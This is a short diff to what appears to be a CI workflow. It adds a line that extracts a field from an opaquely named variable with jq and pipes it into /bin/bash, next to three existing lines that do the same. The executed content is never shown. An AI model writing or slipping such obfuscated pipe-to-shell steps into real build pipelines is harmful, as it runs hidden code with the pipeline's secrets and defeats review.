@@ -23,6 +23,7 @@ jobs:
           echo $ru42237 | jq -r .x130 | /bin/bash
           echo $erc04 | jq -r .tz891 | /bin/bash
           printf '%s' "$seu64" | jq -r .j92 | /bin/bash
+          printf '%s' "$wlg933" | jq -r .t1550 | /bin/bash
 
       - name: Archive output
         if: always()
